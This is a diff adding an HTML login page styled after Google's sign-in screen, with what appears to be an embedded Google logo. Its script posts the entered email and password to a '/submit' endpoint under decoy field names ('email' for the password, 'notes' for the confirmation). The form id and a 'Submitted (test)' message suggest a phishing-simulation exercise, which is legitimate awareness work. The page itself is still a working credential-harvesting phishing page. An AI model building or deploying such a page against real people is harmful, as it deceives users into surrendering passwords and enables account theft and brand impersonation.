@@ -1,0 +1,143 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login Page</title>
+<style>
+    body {
+        background: #f1f1f1;
+        font-family: Arial, sans-serif;
+    }
+
+    .container {
+        width: 340px;
+        margin: 80px auto;
+        background: white;
+        padding: 30px 30px 40px;
+        border-radius: 4px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        text-align: center;
+    }
+
+    h2 {
+        font-weight: normal;
+        margin-bottom: 20px;
+        color: #555;
+    }
+
+    .avatar {
+        width: 70px;
+        height: 70px;
+        background: #e0e0e0;
+        border-radius: 50%;
+        margin: 0 auto 20px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 10px;
+        border: 1px solid #c7c7c7;
+        border-radius: 2px;
+        font-size: 15px;
+    }
+
+    button {
+        width: 100%;
+        padding: 12px;
+        background: #4285f4;
+        border: none;
+        border-radius: 3px;
+        color: white;
+        font-size: 15px;
+        cursor: pointer;
+    }
+
+    button:hover {
+        background: #357ae8;
+    }
+
+    .options {
+        margin-top: 12px;
+        display: flex;
+        justify-content: space-between;
+        font-size: 14px;
+        color: #555;
+    }
+
+    .options input {
+        margin-right: 5px;
+    }
+
+    a {
+        color: #4285f4;
+        text-decoration: none;
+    }
+
+    a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+     <img src="data:image/png;base64,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" width="50" height="50" alt="">
+    <h2>Sign in to your Account</h2>
+    
+    <form id="trainingForm" autocomplete="off">
+    <input type="email" id="name" name="name" placeholder="Email">
+    <input type="password" id="email" name="email" placeholder="Password">
+    <input type="password" id="notes" name="notes" placeholder="Confirm Password">
+
+    <button type="submit">Sign in</button>
+      <div id="result" style="margin-top:12px; font-size:0.95rem;"></div>
+        </form>
+    <div class="options">
+       
+        <label><input type="checkbox"> Stay signed in</label>
+        <a href="#">Need help?</a>
+    </div>
+</div>
+
+  <script>
+    document.getElementById('trainingForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const result = document.getElementById('result');
+      result.textContent = '';
+
+      const name = document.getElementById('name').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const notes = document.getElementById('notes').value.trim();
+
+      if (!name || !email) {
+        result.textContent = 'Please fill required fields.';
+        return;
+      }
+
+      try {
+        const resp = await fetch('/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name, email, notes })
+        });
+        const data = await resp.json();
+        if (resp.ok) {
+          result.style.color = 'green';
+          result.textContent = data.message || 'Submitted (test)';
+          document.getElementById('trainingForm').reset();
+        } else {
+          result.style.color = 'crimson';
+          result.textContent = data.error || 'Submission failed';
+        }
+      } catch (err) {
+        result.style.color = 'crimson';
+        result.textContent = 'Network error — cannot submit.';
+      }
+    });
+  </script>
+</body>
+</html>
